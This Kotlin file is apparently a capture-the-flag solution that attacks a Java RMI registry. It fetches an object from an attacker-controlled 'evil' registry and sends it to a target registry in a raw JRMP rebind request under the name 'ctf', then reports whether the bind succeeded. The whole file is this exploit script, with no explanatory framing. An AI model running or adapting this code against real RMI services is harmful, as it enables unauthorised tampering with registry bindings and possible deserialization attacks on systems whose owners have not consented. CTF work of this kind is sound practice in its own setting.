package soln

import top.ceclin.jrmp.RegistryV2
import top.ceclin.jrmp.request.request
import top.ceclin.jrmp.request.singleOp
import top.ceclin.jrmp.response.Return
import java.net.Socket
import java.rmi.registry.LocateRegistry

fun main(args: Array<String>) {
    require(args.size == 2 || args.size == 3)
    val evilRegistryPort = args[0].toInt()
    val targetRegistryHost = args[1]
    val targetRegistryPort = args.getOrElse(2) { "1099" }.toInt()
    val registry = LocateRegistry.getRegistry(evilRegistryPort)
    val user = registry.lookup("user").also(::println)
    Socket(targetRegistryHost, targetRegistryPort).use {
        val request = RegistryV2.rebind {
            writeObject("ctf")
            writeObject(user)
        }.singleOp().request()
        it.getOutputStream().write(request.value)
        it.getInputStream().readBytes().let { bytes ->
            val ret = Return.decode(bytes)
            println("OK? ${if (ret.isSuccess) "Yes" else "No"}")
        }
    }
}
